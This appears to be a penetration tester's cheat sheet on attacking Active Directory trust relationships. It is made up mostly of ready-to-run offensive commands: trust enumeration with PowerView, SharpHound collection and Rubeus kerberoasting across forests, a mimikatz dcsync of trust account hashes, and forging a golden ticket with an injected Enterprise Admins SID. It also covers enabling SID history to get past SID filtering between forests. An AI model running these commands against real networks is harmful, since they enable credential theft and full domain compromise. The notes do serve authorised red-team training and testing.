# Domain Trust

### General

#### Show Domain Trust (PowerView)

```
PowerShell Get-DomainTrust -Domain other.domain
```

#### Sharphound across Forest (Covenant)

```
(xct) > Assembly SharpHound3 "-c All -D other.domain"
```

#### Kerberoast acress Forest (Covenant)

```
(xct) > Rubeus kerberoast /domain:other.domain
```

### Domain Trust

Enumerate

```
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
Get-DomainTrust -API //PowerView
```

#### Scenario: Domain Admin in one Domain with bidirectional trust to another target domain

When Trust is enabled, computer accounts domain1$  and domain2$ is created (trust account). Shared secret of both domains is these accounts password hashes. This can be dumped as DA in one domain (and can be used for the following steps instead of krbtgt if we can not get our hands on that one):

```
lsadump::dcsync /domain:prod.corp1.com /user:domain1$
```

1. Gather both domains SIDs:

```
Get-DomainSID -Domain domain1
Get-DomainSID -Domain domain2
```

2\. Craft golden ticket to grant Enterprise Privileges&#x20;

```
kerberos::golden /user:<user> /domain:<domain1> /sid:<domain1-sid> /krbtgt:<krbtgt-domain1> /sids:<domain2-sid>-519 /ptt
```

### Forest Trust

Across Forests, extra SIDs are filtered. This can however be disabled on the dc (the intend is to disable it on corporation mergers etc.):

```
netdom trust <domain2> /d:corp1.com /enablesidhistory:yes
```

Despite enabling this, we would still get access denied because SIDs < 1000 are always filtered. In addition members of Global Security Groups will also be filtered. So we need to find a SID > 1000 with privileges that help us, (if its a group it must also not be a member of Global Security Groups).
